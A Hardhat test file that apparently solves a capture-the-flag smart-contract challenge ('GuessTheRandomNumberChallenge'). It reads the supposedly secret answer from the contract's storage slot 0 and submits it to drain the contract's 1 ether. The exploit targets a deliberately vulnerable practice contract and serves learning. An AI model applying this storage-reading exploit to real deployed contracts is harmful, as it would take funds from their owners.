import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract, BigNumber } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheRandomNumberChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    // Deploy the challenge contract with exactly 1 ether.
    target = await (
      await ethers.getContractFactory('GuessTheRandomNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    // Use the attacker account to interact with the contract.
    target = target.connect(attacker);
  });

  it('exploit', async () => {
   
    const guessInt = await target.provider.getStorageAt(target.address, 0);

    // Call the guess function from the attacker account and send 1 ether.
    const tx = await target.guess(guessInt, { value: utils.parseEther('1') });
    await tx.wait();

    // Verify that the challenge is complete (contract balance is zero).
    expect(await target.isComplete()).to.equal(true);
  });
});
